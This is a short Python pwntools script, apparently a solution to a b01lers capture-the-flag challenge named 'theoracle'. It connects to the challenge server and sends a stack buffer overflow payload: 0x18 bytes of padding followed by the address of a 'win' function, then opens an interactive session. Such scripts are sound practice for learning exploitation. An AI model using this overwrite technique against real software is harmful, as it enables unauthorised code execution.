#!/usr/bin/python3
from pwn import *

#p = process ('/home/pooty/shared/biolers/theoracle-ef25f23d8a2218004732f71bfbfa1267')
p = remote( 'chal.ctf.b01lers.com', '1015')

win = p64(0x401196)

p.sendline(b'a' * 0x18 + win)

p.interactive()
